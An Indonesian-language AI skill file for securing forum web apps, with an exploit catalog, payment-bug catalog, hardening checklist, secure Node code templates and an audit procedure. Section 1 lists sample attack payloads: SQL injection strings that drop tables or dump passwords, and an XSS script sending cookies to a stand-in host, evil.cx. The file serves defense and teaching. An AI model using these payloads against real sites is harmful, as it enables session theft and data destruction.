---
name: forum-anti-hack
description: "Use when building/auditing forums vs hacks. Exploit catalog."
version: 1.0.0
author: IKONA
license: MIT
platforms: [linux, macos, windows]
metadata:
  hermes:
    tags: [security, forum, exploit, payment-bug, hardening, owasp, xss, sqli, jwt, webhook, audit]
    related_skills: [security-checklist, business-logic-hunter, bug-hunting, web-api-debugging]
---

# FORUM ANTI-HACK — Exploit Catalog + Payment Bugs + Hardening

## When to Use

Load saat user: mau bikin forum/web app baru, minta audit keamanan, tanya "gimana biar gak kena hack", ada fitur payment/premium/credit, atau mau review code temen/kompetitor yang bocor. Juga wajib dipakai sebelum launch proyek web apa pun buat brand Ikona Oni.

Skill wajib saat **membangun / mengaudit forum atau web app** biar gak jadi bahan olokan. Dibuat gara-gara kasus klasik: temen taruh JWT secret di `index.js` frontend → semua orang bisa forge token admin → forum dibajak massal.

## 0. MEME RULE (aturan paling penting)

> **Apa pun yang ada di browser = bisa dibaca SEMUA orang.**

Kalau JWT key, API key, admin URL, atau credential ada di frontend (index.html, bundle.js, .env yang kebuild, localStorage), itu bukan "secret" — itu pengumuman publik. Attacker cukup view-source atau grep bundle.

**Test wajib sebelum launch:**
```bash
# buka production site → view-source → cari secret
curl -s https://forum.lu | grep -iE "secret|key|token|password|admin"
# grep bundle JS
grep -rE "sk-[a-zA-Z0-9]{10,}|eyJ[A-Za-z0-9_-]{10,}|SECRET" dist/ build/ .next/ 2>/dev/null
```

---

## 1. EXPLOIT CATALOG — cara orang bobol web (dan fix-nya)

### 1.1 Secrets di Frontend
**Vector:** JWT secret / API key / admin path hardcode di JS atau HTML.
**Dampak:** forge token admin, ambil alih semua akun.
**Fix:** secret cuma di server (env). Frontend cuma boleh pegang token sementara, itupun prefer httpOnly cookie, bukan localStorage.

### 1.2 SQL Injection
**Vector:** input user masuk query tanpa parameterized. `WHERE id = $input`, template literal.
**Payload contoh:** `1' OR '1'='1`, `1; DROP TABLE threads;--`, `1' UNION SELECT username,password FROM users--`
**Dampak:** baca/hapus seluruh DB, ambil password hash.
**Fix:** prepared statement SEMUA query. Node: `db.prepare('SELECT * FROM threads WHERE id = ?').get(id)`. PHP: PDO + `bindParam`. JANGAN pernah concat string user ke SQL.

### 1.3 Stored XSS (paling umum di forum)
**Vector:** post/comment/username/bio nyimpen HTML mentah, dirender tanpa escape.
**Payload:** `<script>fetch('https://evil.cx/?c='+document.cookie)</script>`, `<img src=x onerror=...>`, `<svg onload=...>`
**Dampak:** curi session admin/mod → deface → banwave → buang semua user.
**Fix:** escape SEMUA output (`textContent`, bukan `innerHTML`; template engine auto-escape). Kalau perlu rich text → whitelist sanitizer (DOMPurify server-side + client) + CSP.

### 1.4 Auth Bypass JWT
**Vector:** `alg:none` attack, secret lemah (jwt-cracker), exp/iss/aud gak dicek.
**Dampak:** forge token user lain/admin.
**Fix:** whitelist `algorithms: ['HS256']` di verify, secret ≥32 byte random dari env, cek `exp`, `iss`, `aud`. Kalau bisa: jangan JWT untuk session forum — pakai server-side session cookie.

### 1.5 IDOR (Insecure Direct Object Reference)
**Vector:** `/api/thread/123/edit` tanpa cek `thread.author_id === user.id`. `/api/dm/456` tanpa cek participant.
**Dampak:** edit/hapus punya orang, baca DM orang.
**Fix:** setiap endpoint cek ownership SERVER-SIDE: `WHERE id = ? AND author_id = ?`. Jangan percaya "tombolnya kan cuma muncul kalau punya sendiri" — attacker panggil API langsung.

### 1.6 CSRF
**Vector:** endpoint mutasi tanpa token. Attacker bikin `<form>` tersembunyi → korban yang login ngetrigger.
**Dampak:** ganti email, transfer credit, post spam atas nama korban.
**Fix:** CSRF token per session di semua mutasi (POST/PUT/DELETE). Cookie `SameSite=Lax|Strict` minimal.

### 1.7 SSRF via Avatar / Link Preview / Webhook
**Vector:** fitur "ambil avatar dari URL" / preview link / webhook URL user → server fetch URL arbitrary.
**Dampak:** scan internal network, baca `http://169.254.169.254/metadata` (cloud), RCE via gopher.
**Fix:** whitelist scheme http/https, block IP privat/loopback, timeout, redirect limit.

### 1.8 Mass Assignment
**Vector:** register body `{"username":"x","password":"y","role":"admin"}` → ORM bind langsung.
**Dampak:** akun admin gratis.
**Fix:** whitelist field yang boleh di-bind. Jangan spread `req.body` ke model.

### 1.9 Path Traversal + Upload Shell
**Vector:** upload `avatar.php` / `shell.jsp`, atau nama file `../../etc/passwd`.
**Dampak:** RCE, server diambil.
**Fix:** rename file (random name server-side), validasi mime+magic bytes, simpan di luar webroot, jangan execute di folder upload, size limit.

### 1.10 RCE / Template Injection
**Vector:** `eval()`, `Function()` dengan input user, template engine tanpa sandbox, `unserialize()` (PHP).
**Dampak:** total pwnage.
**Fix:** jangan pernah eval input user. Update framework.

### 1.11 Race Condition
**Vector:** 2 request paralel ke endpoint yang kasih benefit (redeem credit, claim reward, checkout).
**Dampak:** double credit, double reward, negative balance.
**Fix:** DB transaction + unique constraint + idempotency. (Detail di bagian Payment.)

### 1.12 Enumeration + Broken Rate Limit
**Vector:** "user tidak ditemukan" vs "password salah" beda pesan; reset password tanpa limit.
**Dampak:** list email valid, brute force.
**Fix:** pesan generik "email/password salah". Rate limit login & reset (mis. 5 percobaan / 15 menit per IP+email). Lockout setelah N gagal.

### 1.13 Webhook Spoofing (payment callback palsu)
**Vector:** attacker POST ke `/api/payment/callback` format sama tanpa signature valid.
**Dampak:** saldo gratis. (Ini kategori "bug payment" — lihat bagian 2.)
**Fix:** verifikasi signature/token dari provider (HMAC), bandingkan amount & status ke provider langsung.

### 1.14 Misconfig
**Vector:** debug mode on, `.git` exposed, directory listing, default admin creds, CORS `*`, firewall mati.
**Dampak:** source bocor, config bocor, admin default masuk.
**Fix:** checklist bagian 4. Scan: `curl -s https://forum.lu/.git/config`.

---

## 2. PAYMENT BUG CATALOG (bug payment — khusus fitur duit)

Kalau forum lu ada premium/credit/QRIS/Saweria/Midtrans, ini yang bikin rugi:

### 2.1 Price Tampering (client-controlled amount)
**Bug:** harga dikirim dari client (`{price: 1000}`), server pakai angka itu.
**Exploit:** ubah jadi `{price: 1}` atau `-100000`.
**Fix:** **harga SELALU dari DB server-side.** Client cuma kirim `product_id` + `qty`.

### 2.2 Race Condition Checkout / Double Credit
**Bug:** cek saldo → tambah saldo, dua langkah tanpa lock. 10 request paralel → saldo x10.
**Fix:** transaction + `SELECT ... FOR UPDATE`, atau unique key per event id, atau single atomic `UPDATE ... SET balance = balance + ? WHERE id = ? AND <kondisi>`. Idempotency key wajib.

### 2.3 Webhook Replay
**Bug:** callback yang sama di-POST 2x (retry provider) → user dikredit 2x.
**Fix:** simpan `transaction_id` provider + unique constraint; kalau sudah ada → return 200 tanpa aksi lagi.

### 2.4 Signature Forgery / Tanpa Verifikasi
**Bug:** callback diterima mentah tanpa cek signature.
**Fix:** verifikasi HMAC/SHA256 signature provider (Midtrans pakai SHA512 + server key; Saweria/QRIS custom wajib validasi token callback + hit endpoint verifikasi ulang). JANGAN percaya "status: success" dari body doang.

### 2.5 Amount Mismatch
**Bug:** user bayar 1000, callback bilang 10000 (atau dimanipulasi), server kredit 10000.
**Fix:** bandingkan `callback.amount === order.amount` persis (integer, sen). Mismatch → hold + alert manual.

### 2.6 Refund Abuse / Double Refund
**Bug:** refund tanpa cek state order (`COMPLETED` pun bisa refund), atau endpoint refund bisa dipanggil 2x.
**Fix:** state machine order: `PENDING → PAID → REFUNDED`, refund cuma dari `PAID`, transisi atomic.

### 2.7 Quantity/Price Edge Cases
**Bug:** `qty=0` gratis, `qty=-5` saldo nambah, float rounding (0.1+0.2).
**Fix:** validasi qty integer 1..max, harga pakai integer (rupiah sen), tolak negatif/zero.

### 2.8 Trial/Credit Farming
**Bug:** kode referral loop (A undang B, B undang A), multi-akun claim promo, delete-account-reset.
**Fix:** satu device/email/phone per claim, referral satu arah + unik, promo sekali per identitas.

### 2.9 Admin/Internal Endpoint Tanpa Auth
**Bug:** `/api/admin/settle-order` bisa dipanggil user biasa.
**Fix:** middleware admin di SETIAP endpoint internal, bukan cuma UI-nya.

**Golden rule payment:** server-authoritative amount + idempotency + signature verify + DB transaction. Empat-empatnya wajib, bukan pilihan.

---

## 3. FORUM ATTACK SURFACE MAP

Audit tiap surface ini satu-satu:

| Surface | Risiko utama |
|---|---|
| register/login/logout/reset | mass assignment, enum, brute force, reset token lemah |
| post/comment/edit/delete | XSS stored, IDOR, SQLi, spam |
| report/moderation | IDOR, privesc mod |
| DM / private message | IDOR baca DM orang |
| avatar & file upload | upload shell, path traversal |
| search | XSS reflected, SQLi, DoS |
| profile & bio | XSS stored, HTML injection |
| admin/mod panel | auth bypass, CSRF |
| payment/premium | semua bagian 2 |
| notifikasi/webhook | SSRF, spoofing |
| API publik | rate limit, CORS, token leak |

---

## 4. HARDENING CHECKLIST PER LAYER

**Auth**
- [ ] bcrypt/argon2 untuk password (JANGAN md5/sha1)
- [ ] Pesan error generik (anti-enumeration)
- [ ] Rate limit + lockout login
- [ ] Reset token: random ≥32B, sekali pakai, expire 30 menit
- [ ] Opsional 2FA buat admin

**Session & Token**
- [ ] Cookie: `HttpOnly; Secure; SameSite=Lax` (minimal)
- [ ] Session server-side (random 32B) > JWT untuk forum
- [ ] Kalau JWT: secret env ≥32B, `algorithms` whitelist, cek `exp`+`iss`
- [ ] Session expire (idle + absolute), logout benar-benar invalidate
- [ ] JANGAN taruh JWT di localStorage kalau ada XSS risk — httpOnly cookie lebih aman

**Input & Output**
- [ ] Prepared statement SEMUA query
- [ ] Escape semua output (`textContent`, auto-escape template)
- [ ] Validasi server-side: tipe, panjang, whitelist
- [ ] Rate limit per IP + per user di semua endpoint publik

**File Upload**
- [ ] Rename server-side, validasi mime + magic bytes, size limit
- [ ] Simpan di luar webroot atau storage object (R2/S3)
- [ ] Jangan serve dengan content-type executable

**API**
- [ ] CORS whitelist domain (bukan `*`)
- [ ] Pagination di list endpoint
- [ ] Error generik (tanpa stack trace) ke client
- [ ] Auth middleware di SEMUA endpoint protected

**Headers**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'; img-src 'self' data: https:; script-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
```
⚠️ CSP harus match stack frontend beneran — `default-src 'self'` mentah bisa blank page kalau pakai CDN Tailwind/Alpine. Tes setelah pasang.

**Deploy & Ops**
- [ ] `.env` di `.gitignore`, `.env.example` dummy value
- [ ] Debug mode OFF di production
- [ ] `.git` gak accessible via web
- [ ] Dependencies: `npm audit` / `pip-audit`, pin versi
- [ ] Rotate secret setelah ada bocor / tiap 90 hari
- [ ] Backup DB rutin + test restore

---

## 5. KODE TEMPLATE (langsung pakai)

### 5.1 Register + bcrypt (Node/Express)
```js
const bcrypt = require('bcrypt');
app.post('/register', async (req, res) => {
  const { username, password } = req.body;
  // whitelist field — jangan spread req.body ke DB
  if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) return res.status(400).end();
  if (password.length < 8) return res.status(400).end();
  const hash = await bcrypt.hash(password, 12); // 12 rounds
  try {
    db.prepare('INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)')
      .run(username, hash, 'user'); // role di-set server, bukan dari body!
    res.status(201).end();
  } catch (e) { res.status(409).end(); } // duplicate
});
```

### 5.2 Session cookie (lebih aman dari JWT untuk forum)
```js
const crypto = require('crypto');
const sessions = new Map(); // production: Redis/DB dengan expire

function newSession(userId) {
  const sid = crypto.randomBytes(32).toString('hex');
  sessions.set(sid, { userId, expires: Date.now() + 7*86400e3 });
  return sid;
}
app.post('/login', (req, res) => {
  const user = /* cek bcrypt */;
  const sid = newSession(user.id);
  res.cookie('sid', sid, { httpOnly: true, secure: true, sameSite: 'lax', maxAge: 7*86400e3 });
});
app.use((req, res, next) => {
  const s = sessions.get(req.cookies.sid);
  if (!s || s.expires < Date.now()) return res.status(401).end();
  req.userId = s.userId;
  next();
});
```

### 5.3 IDOR-proof query pattern
```js
// SELALU bawa owner id di WHERE — bukan cek setelah ambil
const row = db.prepare('SELECT * FROM threads WHERE id = ? AND author_id = ?')
  .get(req.params.id, req.userId);
if (!row) return res.status(404).end(); // 404 (bukan 403) biar gak bocorin eksistensi
```

### 5.4 CSRF token
```js
const csrf = crypto.randomBytes(16).toString('hex');
res.cookie('csrf', csrf, { httpOnly: true, sameSite: 'strict' });
// tiap form kirim header X-CSRF-Token; middleware bandingkan dengan cookie
```

### 5.5 Rate limit sederhana
```js
const hits = new Map();
function rateLimit(key, max, windowMs) {
  const now = Date.now();
  const h = (hits.get(key) || []).filter(t => now - t < windowMs);
  if (h.length >= max) return false;
  h.push(now); hits.set(key, h);
  return true;
}
// login: rateLimit('login:' + ip + email, 5, 15*60e3)
```

### 5.6 Upload aman
```js
const crypto = require('crypto');
const ext = '.png'; // hasil sniff magic bytes, JANGAN dari filename user
const name = crypto.randomBytes(16).toString('hex') + ext;
// simpan di /uploads (di luar webroot), serve via endpoint dengan content-type aman
// tolak > 2MB, tolak mime bukan image
```

### 5.7 Webhook verifikasi (pola generik — sesuaikan provider)
```js
app.post('/api/payment/callback', (req, res) => {
  const expected = crypto.createHmac('sha512', process.env.PAYMENT_SERVER_KEY)
    .update(JSON.stringify(req.body)).digest('hex');
  if (expected !== req.headers['x-signature']) return res.status(401).end();

  const tx = db.prepare('SELECT * FROM orders WHERE id = ?').get(req.body.order_id);
  if (!tx || tx.amount !== req.body.amount) return res.status(400).end();

  // idempotency: kalau sudah PAID, jangan proses lagi
  if (tx.status === 'PAID') return res.status(200).end();

  const r = db.prepare("UPDATE orders SET status = 'PAID' WHERE id = ? AND status = 'PENDING'").run(tx.id);
  if (r.changes === 1) {
    db.prepare('UPDATE users SET balance = balance + ? WHERE id = ?').run(tx.amount, tx.user_id);
  }
  res.status(200).end();
});
```

---

## 6. PRE-LAUNCH AUDIT PROSEDUR

**Manual (wajib):**
1. `view-source` production → cari secret/key/token
2. Register 2 akun → tes IDOR (buka/edit punya orang via ID)
3. Post `<script>alert(1)</script>` → harus ke-escape (jangan eksekusi)
4. Curl paralel 10x ke checkout/redeem → saldo gak dobel
5. Panggil endpoint admin tanpa role admin → 401/403
6. Reset password → token lama gak bisa dipakai lagi
7. Upload file `.php`/`.svg` → ditolak
8. Cek `/.git/config`, `/backup.zip`, directory listing → 404
9. CORS: request dari domain lain ke API → ditolak

**Tools:**
```bash
npm audit --production          # dependency vuln
semgrep --config=p/owasp-top-ten .   # static scan
nuclei -u https://forum.lu      # misconfig scan (pakai template http/cves)
curl -s https://forum.lu/.git/config   # source leak check
```
`sqlmap`/`nikto`/`zap` cuma untuk server sendiri — jangan scan punya orang tanpa izin.

**Kalau pakai database multi-tenant/Postgres:** aktifkan RLS + policy per user.

---

## 7. ANTI-MEME FINAL GATE (pre-launch)

Semua harus ✅ sebelum publish. Kalau satu aja gagal → tahan launch:

- [ ] Gak ada secret di frontend (view-source bersih)
- [ ] Password di-hash bcrypt/argon2
- [ ] XSS payload di post → escape
- [ ] IDOR blocked (tes antar akun)
- [ ] Payment: amount dari server, idempotent, signature verified
- [ ] Rate limit login aktif
- [ ] Debug off, `.git` inaccessible, `.env` gak ke-commit
- [ ] Headers security lengkap + CSP beneran berfungsi
- [ ] Upload gak bisa execute
- [ ] Error ke client generik (tanpa stack trace)

---

## PITFALLS

1. **JWT secret di frontend = auto-pwn.** Ini kasus web temen yang dibikin olokan. Jangan diulang.
2. **"Cukup login doang" gak cukup.** Auth ≠ authorization. Cek ownership di SETIAP endpoint.
3. **innerHTML + user input = XSS.** Pakai `textContent`.
4. **CSP mentah bisa blank page** kalau frontend pakai CDN (Tailwind/Alpine) — tes render setelah pasang CSP.
5. **Callback payment "success" bukan bukti.** Verifikasi signature + banding amount + hit provider.
6. **LocalStorage bukan tempat session.** XSS = session dicuri. Pakai httpOnly cookie.
7. **Jangan percaya mime dari filename upload.** Sniff magic bytes.
8. **Rate limit per IP aja gak cukup** kalau attacker pakai proxy farm — tambah per-akun.

## RELATED SKILLS

- `security-checklist` — checklist universal wajib untuk SEMUA kode yang dikirim
- `business-logic-hunter` — audit logika bisnis/ekonomi mendalam (payment flow, invariant)
- `bug-hunting` — pipeline bug bounty otomatis
- `web-api-debugging` — debug auth/CORS/API
